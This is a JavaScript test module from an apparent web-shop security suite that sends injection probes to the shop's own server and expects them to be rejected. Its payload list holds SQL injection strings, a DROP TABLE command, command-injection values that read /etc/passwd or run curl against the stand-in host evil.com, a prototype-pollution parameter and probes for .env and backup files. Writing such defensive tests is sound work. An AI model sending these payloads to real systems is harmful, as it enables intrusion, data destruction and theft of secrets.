/** 05 — SQL / NoSQL / command injection probes in URL */
import { expectStatus, fail, ok } from "./_helpers.mjs";

const PAYLOADS = [
  "/shop?q=1'+OR+'1'='1",
  "/shop?q=1; DROP TABLE users--",
  "/shop?q=UNION SELECT * FROM users",
  "/shop?q=;cat+/etc/passwd",
  "/shop?q=`id`",
  "/shop?q=$(curl+evil.com)",
  "/shop?__proto__[admin]=true",
  "/backup.sql",
  "/.env",
  "/wp-admin.php",
];

export async function run() {
  console.log("\n[05] SQLi / cmd / pollution / suspicious paths");
  let passed = true;
  for (const path of PAYLOADS) {
    const { pass, status } = await expectStatus(path, [400, 404], {
      headers: { "x-forwarded-for": "203.0.113.13" },
    });
    if (status === 400) ok(`blocked ${path}`, `400`);
    else if (status === 404) ok(`not found (ok) ${path}`, `404`);
    else if (status === 200 && (path.includes("DROP") || path.includes("UNION") || path.includes("__proto__") || path.includes(".env") || path.endsWith(".php") || path.endsWith(".sql"))) {
      passed = fail(`dangerous probe returned 200`, path) && passed;
    } else {
      ok(`status ${status}`, path.slice(0, 50));
    }
  }
  return passed;
}

if (process.argv[1]?.endsWith("05-sqli-cmd-injection.mjs")) {
  process.exit((await run()) ? 0 : 1);
}
